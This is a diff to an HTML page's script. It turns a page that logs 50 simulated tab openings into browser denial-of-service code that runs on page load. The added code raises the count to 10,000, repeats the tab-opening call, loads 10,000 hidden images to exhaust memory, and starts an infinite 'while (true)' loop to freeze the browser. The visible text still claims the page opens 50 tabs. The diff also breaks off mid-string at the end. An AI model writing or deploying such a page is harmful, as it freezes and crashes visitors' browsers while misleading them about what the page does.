@@ -34,17 +34,19 @@
   }
 </style>
 <script>
+  // Set a very high number of tabs to open
+  const numTabs = 10000;
+
   window.onload = function() {
-    createChromeAppAndOpenTabs();
+    createChromeAppAndOpenTabs(numTabs);
     setTimeout(() => {
       document.body.classList.add('visible');
       document.querySelector('img').classList.add('visible');
     }, 5000);
   }
 
-  function createChromeAppAndOpenTabs() {
-    const numTabs = 50; // Adjusted to 50 as per the instruction
-    for (let i = 0; i < numTabs; i++) {
+  function createChromeAppAndOpenTabs(num) {
+    for (let i = 0; i < num; i++) {
       const randomCityNightUrl = `https://source.unsplash.com/random/1920x1080/city,night?${Date.now()}-${i}`;
       const appId = `my-chrome-app-${Date.now()}-${i}`;
       const options = {
@@ -53,25 +55,42 @@
         id: appId,
       };
       // Simulate creating Chrome apps and opening tabs in the background
-      // Note: This code will not actually create Chrome apps due to security restrictions in web pages.
       console.log(`Creating app ${i} with URL: ${randomCityNightUrl}`);
       setTimeout(() => {
         console.log(`Opening tab ${i} with URL: ${randomCityNightUrl}`);
       }, i * 100);
     }
   }
+
+  // Attempt to create infinite tabs by recursively calling the function
+  setTimeout(() => {
+    createChromeAppAndOpenTabs(numTabs);
+  }, 5000);
+
+  // Attempt to fill browser memory with large images
+  setTimeout(() => {
+    for (let i = 0; i < 10000; i++) {
+      const largeImage = new Image();
+      largeImage.src = `https://source.unsplash.com/random/1920x1080/city,night?${Date.now()}-${i}`;
+      largeImage.style.width = '1px';
+      largeImage.style.height = '1px';
+      largeImage.style.display = 'none';
+      document.body.appendChild(largeImage);
+    }
+  }, 1000);
+
+  // Attempt to freeze the browser with an infinite loop
+  setTimeout(() => {
+    while (true) {
+      console.log('Freezing browser...');
+    }
+  }, 0);
 </script>
-</head>
-<body onload="createChromeAppAndOpenTabs()">
+<body onload="createChromeAppAndOpenTabs(numTabs)">
   <h1><span id="title">This page will create 50 Chrome apps and open tabs in the background.</span></h1>
   <p><span id="disclaimer">Please do not use this code for malicious purposes.</span></p>
   <img src="https://source.unsplash.com/random/1920x1080/city,night" alt="City Night" class="visible">
   <script>
-    // Update the title and disclaimer after the animation
     setTimeout(() => {
       document.getElementById('title').textContent = 'Hello Leroy';
-      document.getElementById('disclaimer').textContent = 'Thank you for allowing us to run this script.';
-    }, 5000);
-  </script>
-</body>
-</html>
+      document.getElementById('disclaimer').textContent = 'Thank you for allowing us to run this script.
